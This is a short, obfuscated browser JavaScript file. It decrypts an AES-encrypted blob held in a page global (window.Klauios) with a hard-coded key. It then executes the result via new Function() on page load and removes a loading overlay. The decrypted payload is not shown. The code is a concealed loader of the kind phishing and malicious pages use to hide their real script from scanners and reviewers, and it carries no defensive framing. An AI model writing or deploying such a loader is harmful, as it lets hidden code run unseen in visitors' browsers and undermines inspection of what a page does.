const loadingOverlay = document.getElementById("loading-overlay");
function librarys(_0x5f313d, _0x52859a) {
  var _0x52ebd1 = forge.util.decode64(_0x5f313d);
  var _0x5346d8 = 16;
  var _0x1576bc = _0x52ebd1.substring(0, _0x5346d8);
  var _0x13f934 = _0x52ebd1.substring(_0x5346d8);
  var _0x27cfdb = forge.cipher.createDecipher("AES-CBC", _0x52859a);
  var _0xbffab9 = forge.util.createBuffer(_0x13f934);
  var _0x5b7306 = {
    iv: _0x1576bc
  };
  _0x27cfdb.start(_0x5b7306);
  _0x27cfdb.update(_0xbffab9);
  var _0x1bc9ab = _0x27cfdb.finish();
  if (_0x1bc9ab) {
    var _0x5972cd = _0x27cfdb.output.getBytes();
    var _0x4427a7 = forge.util.decodeUtf8(_0x5972cd);
    return _0x4427a7;
  } else {
    return null;
  }
}
function executeCode() {
  const _0x32ae80 = "RVeAw7k1hrxv9pmui3yfUq8MG0OaH6QL";
  const _0xa0953e = librarys(window.Klauios, _0x32ae80);
  const _0x4709c2 = new Function(_0xa0953e);
  _0x4709c2();
}
executeCode();
loadingOverlay.remove();